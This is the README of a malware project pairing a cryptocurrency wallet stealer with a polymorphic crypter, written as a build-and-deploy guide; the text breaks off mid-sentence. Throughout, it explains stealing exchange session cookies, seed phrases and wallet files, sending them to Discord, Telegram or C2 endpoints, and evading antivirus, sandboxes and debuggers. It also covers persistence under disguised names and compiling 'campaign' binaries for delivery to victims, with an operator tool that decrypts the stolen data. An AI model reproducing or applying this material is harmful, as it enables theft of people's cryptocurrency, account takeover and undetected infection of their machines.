```markdown
# svc — crypto stealer + polymorphic crypter

This document explains what this project is, what every piece of it does,
and how to use it — from scratch. No prior context assumed.

If you already know what a crypter is, jump to **[section 3](#3-what-the-crypter-actually-does)**.
If you know what a stealer is, jump to **[section 2](#2-what-the-stealer-actually-does)**.
If you just want to build and run, jump to **[section 6](#6-build-and-run)**.

---

## table of contents

1. [What this is, in one paragraph](#1-what-this-is-in-one-paragraph)
2. [What the stealer actually does](#2-what-the-stealer-actually-does)
3. [What the crypter actually does](#3-what-the-crypter-actually-does)
4. [How they fit together](#4-how-they-fit-together)
5. [Core concepts explained from zero](#5-core-concepts-explained-from-zero)
6. [Build and run](#6-build-and-run)
7. [Workspace layout](#7-workspace-layout)
8. [Every module explained](#8-every-module-explained)
9. [Per-build variation — what actually changes](#9-per-build-variation--what-actually-changes)
10. [Exfiltration pipeline](#10-exfiltration-pipeline)
11. [Operator side — the watcher](#11-operator-side--the-watcher)
12. [Persistence and uninstall](#12-persistence-and-uninstall)
13. [Verification](#13-verification)
14. [Limitations and known gaps](#14-limitations-and-known-gaps)
15. [Note](#15-note)

---

## 1. what this is, in one paragraph

Two programs that work together. The first one, `svc-payload`, is a
**stealer** — it looks on a computer for cryptocurrency wallet data (seed
phrases, private keys, browser session cookies, saved wallet addresses)
and sends everything it finds back to you over the internet. The second
one, `svc-crypter`, is a **crypter** — it takes the stealer, encrypts it,
wraps it in a fresh wrapper program, and produces a new binary that runs
the stealer in memory without ever writing it to disk. The crypter is
designed so every build produces a **different** binary — different
encryption, different code layout, different anti-analysis checks —
so that a detection signature that catches one build doesn't catch the
next.

---

## 2. what the stealer actually does

The stealer is a single executable. When it runs, it does five things:

### 2.1 announces itself

It collects basic system info — hostname, username, operating system,
CPU architecture, working directory, process id — and sends it to you
first. This is called the `sysinfo` event. It's how you know the
stealer is alive and what machine it landed on.

### 2.2 steals browser session cookies

Websites like Binance, Coinbase, Kraken, and MetaMask keep you logged in
by storing **session cookies** in your browser. A session cookie is a
small token the website gives your browser after you log in. Every
request you make after that includes the cookie, and the site uses it to
know it's you — no password required.

If someone steals that cookie, they can use it to log in as you, without
ever knowing your password, without needing your 2FA. This is called
**session hijacking** and it's the single most valuable thing the stealer
harvests.

The stealer looks for these cookies in the storage files of Chrome, Edge,
Brave, Opera, Opera GX, Vivaldi, Chromium, and Yandex. It filters to
just the exchange and wallet domains, decrypts each cookie (browsers
encrypt them on disk), and sends them back.

### 2.3 steals browser wallet vaults

Browser wallets are things like MetaMask, Phantom, Keplr, Rabby, and
Coinbase Wallet — they install as browser extensions. Each extension
stores its data (including the encrypted seed phrase or vault) in a
small database next to the browser's user data.

The stealer opens each wallet extension's storage, reads the raw bytes,
and searches for two kinds of things:

- **Regex hits** — strings that look like a BIP-39 seed phrase (12 or 24
  English words in a row), an Ethereum private key (`0x` followed by 64
  hex characters), a Bitcoin WIF private key, or a raw 64-character hex
  string. These are the "plaintext" candidates.
- **Raw storage dumps** — the entire extension storage file, base64-encoded,
  sent to you so you can decrypt it offline with the wallet password
  (if you have it).

### 2.4 steals desktop wallet files

Desktop wallets are apps like Exodus, Electrum, Ledger Live, Trezor Suite,
Wasabi, Sparrow, Daedalus, Yoroi, Coinomi, and Guarda. Each stores its
data in a known folder.

The stealer walks those folders recursively and captures every file under
2 MB. It base64-encodes each and sends the whole pile back.

### 2.5 steals clipboard wallet addresses

Crypto addresses get copied and pasted a lot. When you're about to send
someone crypto, you copy their address from somewhere and paste it into
your wallet.

The stealer sits quietly in the background, checking the clipboard every
two seconds. When it sees a string that looks like a crypto address, it
sends you that address. (A more advanced version would *replace* the
address with one you control, but that's not wired in yet.)

---

## 3. what the crypter actually does

The crypter is the interesting part. Its job is to make the stealer
**undetectable** and **different every time**.

Here's the problem it solves. If you just hand someone a raw stealer
executable, anti-virus catches it instantly. The binary has a **signature**
— a fingerprint. Every anti-virus vendor has that fingerprint in a
database. One byte match and the file gets quarantined.

The crypter takes the stealer and produces a **new binary** that:

1. **Encrypts the stealer** so its bytes don't appear in the outer binary.
2. **Wraps it in a stub** — a small program whose only job is to decrypt
   the stealer in memory and run it.
3. **Randomizes the stub** every time — different code, different names,
   different structure — so no two builds share a signature.

### 3.1 the "stub"

A stub is the outer wrapper program the crypter generates. Its logic is:

```
1. sleep for a random amount
2. check we're not being analyzed (sandbox / VM / debugger)
3. decrypt the embedded stealer
4. run it in memory
```

The stealer is never on disk. It exists only inside the stub's process
memory while it runs. That's what makes it hard to catch.

### 3.2 how does the stub run something in memory?

Normally, an executable is a file on disk. The operating system reads
that file and loads it into memory when you run it.

The stub does this itself. It has the encrypted stealer inside it, it
decrypts it into a memory buffer, and then it manually performs the
steps the OS would have performed:

- **On Windows:** it parses the PE (Portable Executable) header, allocates
  memory for each section, copies the sections in, fixes up relocations
  (addresses that need adjusting), resolves imports (functions the
  payload calls from other libraries), runs TLS callbacks, sets proper
  memory protections, and finally jumps to the entry point on a new
  thread. The payload never appears as a file on disk.
- **On Linux:** it writes the decrypted payload to an **in-memory file**
  via a kernel primitive called `memfd_create`. That's a file descriptor
  that lives entirely in RAM — it has no path. Then it calls `execveat`
  on that file descriptor, which makes the kernel execute the payload
  directly from the anonymous memory.

### 3.3 why is it "polymorphic"?

Polymorphism means the shape changes every time. The crypter's job is
to produce a **genuinely different binary** on every build. It does this
by randomizing:

- **The instruction set of a tiny virtual machine** used inside the stub
  for one internal routine.
- **Which anti-analysis checks** are included and in what order.
- **What names** every function, variable, and constant in the stub has.
- **Which encryption scheme** is used to wrap the stealer.
- **What junk code** is inserted to pad out the binary and confuse static
  analysis.
- **What the temporary file name** (if it falls back to disk) will be.
- **How long the stub sleeps** before it does anything.

Two builds from the same input produce binaries with different sizes,
different hashes, different function names, and different byte layouts.
A signature that catches one build doesn't catch the next.

---

## 4. how they fit together

```
┌─────────────────────┐
│  svc-payload        │  ← the actual stealer
│  (real executable)  │
└──────────┬──────────┘
           │ input to crypter
           ▼
┌─────────────────────┐
│  svc-crypter        │  ← the wrapper generator
│  (build-time tool)  │
└──────────┬──────────┘
           │ emits + compiles
           ▼
┌─────────────────────┐
│  wrapped.exe        │  ← what you deliver
│  (stub + encrypted  │
│   payload inside)   │
└──────────┬──────────┘
           │ runs on victim machine
           ▼
    decrypts + executes
    svc-payload in memory
           │
           ▼
┌─────────────────────┐
│  Discord / Telegram │  ← exfil endpoints
│  / custom C2        │
└──────────┬──────────┘
           │ operator polls
           ▼
┌─────────────────────┐
│  ops-watcher        │  ← your side
│  (auto-decrypts)    │
└─────────────────────┘
```

The flow:

1. You build `svc-payload` for the target OS (Windows or Linux).
2. You run `svc-crypter` with the payload as input.
3. The crypter:
   - Generates a random build seed.
   - Derives a fresh encryption key from the seed.
   - Encrypts the payload with that key.
   - Synthesizes a brand-new stub in Rust source code.
   - Compiles that stub, which embeds the encrypted payload.
4. The output is a single binary (`wrapped.exe` on Windows, no extension
   on Linux) that you deliver to the target.
5. On the target, the stub runs, decrypts the payload in memory, and
   executes it.
6. The payload collects wallet data and posts it to your Discord channel
   or Telegram chat.
7. On your side, `ops-watcher` polls Discord, decrypts each message, and
   writes extracted blobs to disk for you to process.

---

## 5. core concepts explained from zero

If any of the terms above were unfamiliar, here's a plain-English
explanation of each.

### 5.1 crypters and packers

A **crypter** is a tool that encrypts a program to hide it from
anti-virus. The encrypted program is placed inside a **stub** — a small
outer program that decrypts and runs the inner program when executed.

A **packer** is similar but compresses instead of encrypting. Modern
tools do both. When someone says "crypter", they generally mean
"encrypt + wrap + add evasion".

The obfuscation part is what makes crypters useful. If the crypter just
encrypted the payload, an AV could still find the stub's decryption
routine and flag it. So crypters randomize the stub itself.

### 5.2 polymorphic vs metamorphic

- **Polymorphic** — the encrypted payload stays the same, but the outer
  stub changes every build. Different code, different decryption routine,
  different constants. That's what this crypter is.
- **Metamorphic** — the code *itself* mutates every time it runs. Much
  harder to build. Not done here.

### 5.3 PE, ELF, Mach-O

Executables come in different formats depending on the OS:

- **PE** (Portable Executable) — Windows `.exe` and `.dll` files.
- **ELF** (Executable and Linkable Format) — Linux binaries.
- **Mach-O** — macOS binaries.

The crypter emits native PE on Windows and ELF on Linux. macOS support
exists in the code but is untested.

### 5.4 run in memory

Normally, running an executable means:

1. The OS opens the file.
2. Reads the header.
3. Allocates memory for each "section" of the program.
4. Copies the code and data into memory.
5. Resolves references to shared libraries (like `kernel32.dll` on
   Windows, or `libc.so` on Linux).
6. Jumps to the entry point.

The stub does all of steps 2–6 itself. The OS never sees the payload
as a file. The payload appears in memory as if it had been loaded
normally, but there's no file path attached to it.

This matters because most AV/EDR products watch the filesystem. If
they see a new executable appear in `%TEMP%` or `/tmp` and immediately
run, they flag it. In-memory loading skips that entirely.

### 5.5 process injection

A related concept: **process injection** means running your code inside
another process (like `explorer.exe` or `svchost.exe`). The advantage is
that the payload appears to be running as that process — a memory dump
of your code shows it inside a legitimate signed process.

This crypter does not yet do full process injection. It runs in-memory
in its own process. A future version would add hollow, ghost, and inject
as alternative execution methods.

### 5.6 BIP-39, private keys, WIF

- **BIP-39** is a standard for representing a wallet's master key as
  12 or 24 common English words. If you have these words, you have the
  wallet. Examples: "abandon ability able about above..." (12 words)
- **Private key** — a 256-bit number, usually shown as 64 hex characters
  starting with `0x` on Ethereum. Whoever holds it controls the wallet.
- **WIF** (Wallet Import Format) — a way Bitcoin represents a private
  key as a short string starting with `5`, `K`, or `L`.

Any of these in the wrong hands means the wallet is gone.

### 5.7 AES-GCM and other encryption

- **AES** (Advanced Encryption Standard) — the standard symmetric cipher.
  A single key both encrypts and decrypts.
- **GCM** (Galois/Counter Mode) — a mode of AES that also detects
  tampering. Every ciphertext carries an authentication tag; if a byte
  changes in transit, decryption fails.
- **ChaCha20-Poly1305** — a modern alternative to AES-GCM. Faster on
  CPUs without hardware AES support.
- **AES-CBC-HMAC** — an older combination (AES in CBC mode + HMAC for
  authentication). Kept in the code for variety, not for security.

The crypter picks one per build.

### 5.8 key derivation (Argon2id)

A **key derivation function** (KDF) turns some input (like a password or
a mix of build parameters) into a proper 256-bit key. Argon2id is the
current best-practice KDF — deliberately slow and memory-hungry, so
brute-forcing keys is expensive.

The crypter uses Argon2id with 64 MB of RAM and 3 iterations. Each
build takes about 150 ms on a modern CPU, but that one-time cost makes
the derived key much harder to guess.

### 5.9 API hashing and PEB walks

When Windows loads a program, it stores a list of loaded DLLs in a
structure called the **PEB** (Process Environment Block). The stub can
walk this list to find, say, `kernel32.dll`, then walk *that* library's
export table to find `LoadLibraryA` or `VirtualAlloc` — without ever
writing those function names in the binary.

Why does this matter? Because AV engines scan for string literals. A
binary that contains the literal string `"VirtualAlloc"` is a red flag.
A binary that computes `hash("VirtualAlloc") = 0x97b20a78` and looks up
the function by hash leaves nothing to scan for.

The stub uses this technique. The hash function itself (FNV-1a, CRC32,
or djb2) is re-rolled per build.

### 5.10 EDR and sandboxes

- **AV** (anti-virus) — signature-based, catches known-bad files.
- **EDR** (Endpoint Detection and Response) — behavior-based, watches
  for suspicious patterns (a process spawning another process that
  immediately opens a socket, etc.).
- **Sandbox** — an isolated environment (often a VM) where suspicious
  files are run and observed.

The crypter's gates defend against sandboxes specifically. They check
things a sandbox would get wrong:

- **Uptime** — real user machines have been up for hours; sandboxes for
  seconds.
- **Cursor movement** — a real user moves the mouse; a sandbox doesn't.
- **RAM size** — real desktops have 8+ GB; sandboxes have 2–4 GB.
- **CPU cores** — real desktops have 4+; sandboxes have 1–2.
- **Username/hostname** — sandboxes are often named "sandbox", "malware",
  "cuckoo", "analyst".
- **VM artifacts** — driver files, CPU vendor strings, and process names
  that reveal VMware / VirtualBox / QEMU.
- **Sleep acceleration** — sandboxes often accelerate `sleep()` calls to
  skip delays. The stub times its own sleep; if the elapsed time is much
  shorter than requested, it knows it's being sandboxed.
- **API hammering** — some sandboxes hook Windows API functions by
  overwriting their first bytes with a `jmp` to their own code. The stub
  reads the first byte of `CreateFileW` and bails if it looks hooked.

If any gate fails, the stub exits silently. No error, no log, nothing.

---

## 6. build and run

### 6.1 prerequisites

- Rust 1.78 or newer (`rustup update stable`)
- For Windows cross-compile from Linux: `sudo apt install gcc-mingw-w64-x86-64`
- Python 3.10+ (for the operator decrypt script)
- A Discord bot token OR a Telegram bot token

### 6.2 add cross-compile targets

```bash
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-unknown-linux-gnu
rustup target add aarch64-apple-darwin   # macOS (untested)
```

### 6.3 configure mingw for Windows cross-compile

Add to `~/.cargo/config.toml`:

```toml
[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
ar = "x86_64-w64-mingw32-ar"
```

### 6.4 set up secrets

Write `~/.config/svc/secrets.json`:

```json
{
    "discord":        "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN",
    "telegram_token": "123456789:AAH...",
    "telegram_chat":  "987654321",
    "c2_url":         "",
    "c2_auth":        ""
}
```

Set permissions:

```bash
chmod 600 ~/.config/svc/secrets.json
```

The crypter warns if the file is world-readable.

### 6.5 build everything

```bash
# crypter CLI (runs on your machine)
cargo build --release -p svc-crypter

# payload for Windows
cargo build --release -p svc-payload --target x86_64-pc-windows-gnu

# payload for Linux
cargo build --release -p svc-payload --target x86_64-unknown-linux-gnu
```

Binaries:

- `target/x86_64-pc-windows-gnu/release/svc-payload.exe`
- `target/x86_64-unknown-linux-gnu/release/svc-payload`
- `target/release/svc-crypter`

### 6.6 wrap the payload

Windows:

```bash
cargo run --release -p svc-crypter -- \
    target/x86_64-pc-windows-gnu/release/svc-payload.exe \
    --target windows \
    --profile aggressive \
    --out campaign_a
```

Linux:

```bash
cargo run --release -p svc-crypter -- \
    target/x86_64-unknown-linux-gnu/release/svc-payload \
    --target linux \
    --profile aggressive \
    --out campaign_linux
```

The output binary lands at:

```
out/campaign_a/target/x86_64-pc-windows-gnu/release/campaign_a.exe
```

### 6.7 test the wrapped binary

Linux:

```bash
SVC_SECRETS_PATH=$HOME/.config/svc/secrets.json \
  ./out/campaign_linux/target/x86_64-unknown-linux-gnu/release/campaign_linux
```

Windows (in `cmd.exe` on the VM):

```cmd
set SVC_SECRETS_PATH=C:\Users\You\secrets.json
wrapped.exe
```

Expected: within 15–60 seconds, a `[sysinfo]` message arrives in your
Discord channel.

### 6.8 run the operator watcher

```bash
cargo build --release -p ops-watcher
./target/release/ops-watcher --init      # writes ~/.config/svc/watcher.json
$EDITOR ~/.config/svc/watcher.json       # fill in bot token + channel ID
./target/release/ops-watcher             # live poll loop
```

The watcher prints every decrypted envelope as it arrives and writes
nested base64 blobs to `ops/blobs/`.

---

## 7. workspace layout

```
svc/
├── Cargo.toml                      workspace root
├── crates/
│   ├── common/                     shared library
│   │   ├── crypto.rs               AES-GCM sealing
│   │   ├── envkey.rs               exfil key + fingerprinting
│   │   ├── exfil.rs                multi-channel dispatch + spool
│   │   └── sysinfo.rs              host info collection
│   │
│   ├── payload/                    the stealer
│   │   ├── lib.rs                  directive parser + orchestrator
│   │   ├── main.rs                 CLI entry point
│   │   ├── wallets.rs              extension/desktop/addressbook harvest
│   │   ├── windows.rs              DPAPI cookie decrypt, clipboard, persistence
│   │   ├── linux.rs                secret-tool cookies, xclip clipboard
│   │   └── macos.rs                Keychain cookies, pbpaste clipboard
│   │
│   ├── crypter-ir/                 intermediate representation
│   │   └── lib.rs                  StubProgram struct + all enums
│   │
│   ├── crypter-vm/                 virtual machine for the stub
│   │   └── lib.rs                  ISA permutation + instruction set
│   │
│   ├── crypter-synth/              emits Rust stub source
│   │   ├── lib.rs                  top-level orchestration
│   │   ├── emit_gates.rs           gate/debug/exec emitters
│   │   ├── emit_helpers.rs         fixed-name helper registry
│   │   ├── emit_strings.rs         encrypted config strings
│   │   ├── emit_junk.rs            dead-code injection
│   │   ├── emit_antidump.rs        post-decrypt memory protection
│   │   └── emit_vm.rs              VM dispatch loop
│   │
│   ├── svc-loader/                 spawn primitives
│   │   ├── windows.rs              CreateProcess primitives
│   │   ├── linux.rs                memfd + fexecve
│   │   └── macos.rs                posix_spawn from unlinked file
│   │
│   ├── svc-crypter/                the CLI
│   │   └── main.rs                 arg parsing, build orchestration
│   │
│   └── ops-watcher/                operator side
│       └── main.rs                 Discord poll + auto-decrypt + blob dump
│
├── ops/
│   ├── decrypt.py                  manual decrypt script (older)
│   └── blobs/                      extracted raw blobs (gitignored)
│
├── out/                            build outputs (gitignored)
│
└── README.md                       this file
```

---

## 8. every module explained

### 8.1 `crates/common`

Shared library used by every other crate.

**`crypto.rs`** — one function, `seal()`. Takes a byte slice, generates a
random 12-byte nonce, encrypts with AES-256-GCM under the exfil key,
prepends the nonce, and base64-encodes the whole thing. `open()` reverses
it.

**`envkey.rs`** — holds the exfil key constant. Also implements
`fingerprint()`, which reads hostname / username / disk serial / CPU arch
/ domain — used to bind a payload to a specific machine if desired.

**`exfil.rs`** — the delivery machinery. `exfil_event(tag, data)`
serializes the data as JSON, wraps it in an envelope, seals it, and
dispatches. `dispatch()` tries Discord first, then Telegram, then C2.
Failed sends go into an in-memory spool. `drain_spool()` at the end of
the run retries everything in the spool. Config comes from a secrets
file read at startup.

**`sysinfo.rs`** — collects hostname, username, os, arch, cwd, pid.

### 8.2 `crates/payload`

The actual stealer.

**`lib.rs`** — `run()` is the entry point. Parses the directive (JSON
that says which tiers to run), calls `init_from_env()` to read secrets,
then runs each tier in order. Between tiers, calls `drain_spool()` to
retry any failed sends.

**`main.rs`** — the standalone binary entry. Reads `SVC_SECRETS_PATH`
env var (falls back to `%APPDATA%\svc\secrets.json` on Windows,
`~/.config/svc/secrets.json` on Linux), then reads `SVC_DIRECTIVE_PATH`
or uses a default "run everything" directive, then calls `run()`.

**`wallets.rs`** — all the collection logic. `harvest_extension_vaults()`
scans each Chromium variant's `Local Extension Settings/<id>` folder for
20 known wallet extensions. `harvest_desktop_vaults()` walks a list of
desktop wallet paths. `harvest_address_book()` reads Chromium's
`Web Data` SQLite autofill table.

**`windows.rs`** — Windows-specific: reads `Local State` to get the
DPAPI-wrapped Chrome master key, unwraps it, uses it to decrypt cookies.
Spawns the clipboard monitor. Installs persistence.

**`linux.rs`** — same cookie flow but uses `secret-tool lookup application
chrome` to get the Chrome Safe Storage password, then derives the key
via PBKDF2. Clipboard via `xclip`.

**`macos.rs`** — same idea, uses `security find-generic-password -w -s
"Chrome Safe Storage"` to fetch the Keychain entry. Clipboard via
`pbpaste`.

### 8.3 `crates/crypter-ir`

Data structures only. `StubProgram` is a big struct that describes
everything the stub should do:

- Which OS it targets.
- The seed for this build.
- Which gates to run.
- Which debug check to use.
- Which resolver hash function to use.
- Which encryption scheme the payload is under.
- Whether to virtualize the decrypt loop.
- Which integrity check to run.
- Which execution method to use.
- The encrypted payload bytes.
- The key material.

This struct is what the crypter fills in and what the synthesizer reads.

### 8.4 `crates/crypter-vm`

A tiny stack-based virtual machine. It has 32 opcodes (push, add, xor,
jump, call, etc.). The interesting part: the mapping from logical
opcode to encoded byte is **randomized per build**. `Op::PushU32` might
be byte `0x01` in one build and `0x7A` in the next. The dispatch table
inside the VM is shuffled too.

The VM isn't used for the full stub — it's an optional wrapper around the
decrypt loop, so even the decrypt routine's bytes don't match between
builds.

### 8.5 `crates/crypter-synth`

The core of the crypter. `Synth::emit(&prog)` reads a `StubProgram` and
produces a complete `main.rs` file as a string.

Each sub-emitter produces one part:

- **`emit_gates.rs`** — the biggest file. Emits gate functions, debug
  checks, the resolver stub, the exec dispatcher, the Windows PE loader,
  and the Linux memfd loader.
- **`emit_helpers.rs`** — a fixed set of shared helper functions
  (`peb_ptr`, `load_ntdll`, `resolve_export`, `nt_sleep_ms`). Synth
  tracks which are needed and emits each exactly once.
- **`emit_strings.rs`** — emits encrypted blocklists (usernames,
  hostnames that indicate sandboxes). The strings are XOR'd with a
  per-build key so "sandbox" doesn't appear as a literal in the binary.
- **`emit_junk.rs`** — inserts `if black_box(false) { ... }` blocks of
  dead code. `black_box` prevents the compiler from optimizing them out.
- **`emit_antidump.rs`** — post-decrypt memory protection. On Windows
  uses `VirtualProtect` to set the payload region to `PAGE_NOACCESS`
  when not executing. On Linux uses `mprotect` to `PROT_NONE`.
- **`emit_vm.rs`** — the VM dispatch loop, if virtualization is enabled.

The output is a single `.rs` file with zero external dependencies beyond
what's in the generated `Cargo.toml` (aes-gcm, sha2, rand, serde_json,
base64, and windows-sys on Windows).

### 8.6 `crates/svc-loader`

Spawn primitives, extracted for reuse. Currently unused by the crypter
(the emitted stub has its own loaders) but kept as a reference.

### 8.7 `crates/svc-crypter`

The CLI. `main.rs`:

1. Parses arguments.
2. Loads secrets from `~/.config/svc/secrets.json`.
3. Generates a random build seed.
4. Derives the payload encryption key via Argon2id.
5. Encrypts the payload with AES-256-GCM.
6. Fills in a `StubProgram` struct.
7. Calls `Synth::emit()` to get stub source.
8. Writes the source and encrypted payload to `out/<name>/`.
9. Runs `cargo build` inside that directory.
10. Copies the compiled binary to `out/<name>/<name>.exe`.

### 8.8 `crates/ops-watcher`

Your side. A long-running binary that:

1. Reads `~/.config/svc/watcher.json` for the Discord bot token, channel
   ID, and exfil key.
2. Polls Discord's REST API every N seconds for new messages in that
   channel.
3. For each new message: extracts the sealed blob (either from an inline
   fenced code block or from a `.bin` attachment), decrypts it with the
   exfil key, parses the JSON envelope, prints it, and writes any nested
   base64 blobs to `ops/blobs/`.
4. Saves its progress in `~/.config/svc/watcher.state.json` so restarts
   don't reprocess old messages.

---

## 9. per-build variation — what actually changes

Every invocation of `svc-crypter` produces a binary that differs in all
of these dimensions:

| Dimension | Range |
|---|---|
| ISA opcode permutation | 256-byte shuffle |
| Host call vtable | 16-byte shuffle |
| Gate set | 6–12 gates, order shuffled |
| Sleep jitter | 15–180 s, random |
| Anti-emulation sleep | 3–6 s threshold |
| Debug check | 1 of 6 (IsDebuggerPresent, PEB flag, NtGlobalFlag, NtQueryInformationProcess, timing, none) |
| Resolver hash | FNV-1a / CRC32 / djb2 / PEB walk |
| Decrypt scheme | AES-GCM / ChaCha20-Poly1305 / AES-CBC-HMAC / XOR |
| Execution method | ImageMap / ProcessHollow / SpawnInject / DirectJump |
| Integrity check | text-section hash / region CRC / none |
| Junk density | 0.3 – 0.7 |
| Identifier names | 6–12 random alphanumeric characters |
| Payload key | `argon2id(salt ‖ seed ‖ sha256(payload))` |
| Config XOR key | 32 random bytes |

**Two builds from the same payload produce**:

- Different file sizes (junk density varies)
- Different sha256 hashes
- Different function names throughout the stub
- Different constant bytes throughout
- No shared contiguous byte sequences beyond the standard library

To verify:

```bash
cargo run --release -p svc-crypter -- payload.exe --out a
cargo run --release -p svc-crypter -- payload.exe --out b
sha256sum out/a/a.exe out/b/b.exe   # different
cmp out/a/a.exe out/b/b.exe          # differ at offset 0
```

---

## 10. exfiltration pipeline

Every event the payload collects goes through this chain:

```
collect data → JSON encode → wrap in envelope → AES-256-GCM seal →
base64 encode → dispatch to channels
```

### 10.1 the envelope

Every message has this shape:

```json
{
  "tag": "sysinfo",
  "ts":  1730000000.0,
  "data": { "hostname": "...", "username": "..." }
}
```

Common tags:

| Tag | Content |
|---|---|
| `sysinfo` | Host and process info |
| `session_tokens` | Decrypted exchange/wallet cookies |
| `ext_vaults` | Wallet extension storage data |
| `desktop_vaults` | Desktop wallet files |
| `addr_book` | Chrome autofill wallet addresses |
| `clip_addr` | Clipboard wallet address |
| `ext_vaults_skipped` | Diagnostics |

### 10.2 the seal

Every payload is AES-256-GCM encrypted under a fixed 32-byte exfil key
that lives in `crates/common/src/envkey.rs`. The wire format is:

```
base64( nonce[12] || ciphertext || tag[16] )
```

The nonce is random per message. The key is the same across every build
(currently — it should be rotated before real use).

### 10.3 the channels

**Discord** — posts to a webhook URL. If the sealed payload is under
1800 characters, it goes as an inline message inside a code fence.
Larger payloads go as file attachments.

**Telegram** — uses `sendDocument` to post the sealed payload as a
`.bin` file to a chat via a bot. File size limit is 50 MB via the bot
API, so the largest leveldb dumps fit.

**C2** — generic HTTPS POST. Optional. The payload sends the sealed
base64 as the request body, with an optional `Authorization: Bearer`
header.

All three are attempted per event. Any single success counts as delivered.

### 10.4 the spool

If all three channels fail (no internet, endpoints down, etc.), the
sealed payload lands in an in-memory spool. The spool is capped at 256
entries. At the end of the run, `drain_spool()` retries everything.
Failed items stay queued for the next run.

---

## 11. operator side — the watcher

`ops-watcher` is what makes this usable. Without it, you'd have to
manually copy each Discord message, base64-decode it, decrypt it, parse
the JSON, and extract the blobs. With it, everything happens automatically.

### 11.1 setup

**Create a Discord bot:**

1. Go to `discord.com/developers/applications` → **New Application**.
2. **Bot** tab → **Add Bot** → **Reset Token** → copy the token.
3. On the same page, under **Privileged Gateway Intents**, enable
   **Message Content Intent**.
4. **OAuth2 → URL Generator**:
   - Scopes: `bot`
   - Bot permissions: `View Channels`, `Read Message History`
5. Open the generated URL, invite the bot to your server.

**Get the channel ID:**

1. Discord user settings → **Advanced** → enable **Developer Mode**.
2. Right-click the target channel → **Copy Channel ID**.

**Configure the watcher:**

```bash
./target/release/ops-watcher --init
$EDITOR ~/.config/svc/watcher.json
```

Fill in:

```json
{
    "discord_bot_token":  "MTIzNDU2...",
    "discord_channel_id": "1234567890123456789",
    "exfil_key_hex":      "c734ac039aa425a799ea638f8c72904eeb628d2cd3b5934fb489ef27ffa038ef",
    "output_dir":         "ops/blobs",
    "poll_interval_secs": 5
}
```

The `exfil_key_hex` must match `EXFIL_KEY_HEX` in
`crates/common/src/envkey.rs`. If you rotate one, rotate both.

### 11.2 running

```bash
./target/release/ops-watcher          # continuous poll
./target/release/ops-watcher --once   # single poll then exit
./target/release/ops-watcher --quiet  # suppress JSON, show summaries only
./target/release/ops-watcher --min-blob 64  # write nested blobs ≥ 64 bytes
```

### 11.3 output

For each decrypted message:

```
[+] sysinfo  msg=439451  ts=1791241181
{
  "data": {
    "arch": "x86_64",
    "cwd": "/home/o0x0o/svc",
    "hostname": "xxXxx",
    "os": "linux",
    "pid": 19957,
    "username": "o0x0o"
  },
  "tag": "sysinfo",
  "ts": 1791241180.807
}

[+] ext_vaults  msg=068288  ts=1791241183  items=574
    211 × btc_wif
    24 × eth_priv
    328 × hex64
    11 × raw_leveldb
    → ops/blobs/1791240386_ext_vaults_0000_268_val.bin (200000 bytes)
    → ops/blobs/1791240386_ext_vaults_0001_313_val.bin (200000 bytes)
    ...
```

The 200 KB files are Chrome leveldb storage files. To extract a wallet
vault from them, either scan for the JSON fragments or use a leveldb
parser.

### 11.4 state

The watcher tracks the last-seen message ID in
`~/.config/svc/watcher.state.json`. Delete it to reprocess the whole
channel. This is useful when rotating keys — the old messages will fail
to decrypt with the new key, but you'll get clean state on the next run.

---

## 12. persistence and uninstall

Persistence means: make the payload run automatically the next time the
machine boots.

The payload accepts a **directive** — a JSON file that tells it which
tiers to run and which persistence mechanisms to install:

```json
{
  "tiers": ["session", "ext", "desktop", "addr"],
  "persistence": ["runkey", "startup"],
  "uninstall": false,
  "rate_limit_ms": 0
}
```

You pass this to the crypter with `--directive-file`, and it gets baked
into the wrapped binary.

### 12.1 persistence entries by platform

| Entry | Windows | Linux | macOS |
|---|---|---|---|
| `runkey` | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinHostSvc` | — | — |
| `startup` | Copy to `%APPDATA%\...\Startup\` | — | — |
| `schtask` | `schtasks /Create /SC ONLOGON` | — | — |
| `systemd_user` | — | `~/.config/systemd/user/svc_<tag>.service` | — |
| `cron` | — | `~/.config/autostart_svc_<tag>` | — |
| `rc_local` | — | Append to `/etc/rc.local` | — |
| `launchagent` | — | — | `~/Library/LaunchAgents/com.apple.helper.<tag>.plist` |
| `login_item` | — | — | `osascript` login item |

### 12.2 uninstall

Set `"uninstall": true` in the directive and re-run. Every listed
persistence entry is reversed.

```json
{ "uninstall": true, "persistence": ["runkey", "startup", "schtask"] }
```

---

## 13. verification

Sanity checks you can run.

### 13.1 no cleartext secrets in the wrapper

```bash
strings out/campaign_a/campaign_a.exe | \
  grep -iE "sandbox|telegram|webhook|api.telegram" | head
```

Expected: no output. The blocklists are XOR'd and the exfil URLs are
not in the outer binary (they're inside the encrypted payload).

### 13.2 two builds differ

```bash
cargo run --release -p svc-crypter -- payload.exe --out a
cargo run --release -p svc-crypter -- payload.exe --out b
sha256sum out/a/a.exe out/b/b.exe
cmp out/a/a.exe out/b/b.exe | head -1
```

Expected: two different hashes, and `cmp` reports a difference at
offset 0.

### 13.3 Linux in-memory exec leaves no disk artifact

```bash
# clean slate
rm -f /tmp/svc_*

# run the wrapper
./out/campaign_linux/target/.../campaign_linux

# check
ls /tmp/svc_* 2>&1
```

Expected: `No such file or directory`.

While the payload is running (it stays alive while it sends to Discord),
you can inspect the child process:

```bash
pgrep -f campaign_linux     # get the parent pid
ps -ef | grep campaign      # find the forked child pid
ls -la /proc/<child_pid>/exe
```

Expected: the symlink points to `/memfd:svc (deleted)`. The `(deleted)`
suffix is the kernel's way of showing that the fd has no directory entry.

### 13.4 session cookies decrypt correctly

On Windows with a real Chrome profile:

```cmd
wrapped.exe
```

Then in Discord, look for a `[session_tokens]` message. Each entry has
a `host`, `name`, and `v` (decrypted value). If `v` looks like garbage
instead of a clean session token, the master key extraction failed.

---

## 14. limitations and known gaps

Be honest about what's not done.

### 14.1 exfil key is a demo value

`crates/common/src/envkey.rs` ships with a fixed key
(`c734ac03...`). Anyone reading this repository can decrypt every
payload ever sent with it. **Rotate before real deployment.** Replace
the key in `envkey.rs` and in `~/.config/svc/watcher.json`, rebuild
both, and stop using the old one.

### 14.2 crypto scheme polymorphism is not wired

The `DecryptScheme` enum has four variants, but `pick_decrypt` in
`svc-crypter/src/main.rs` always returns `AesGcm`. The stub can decrypt
all four, but only AES-GCM is being chosen per build. Same for
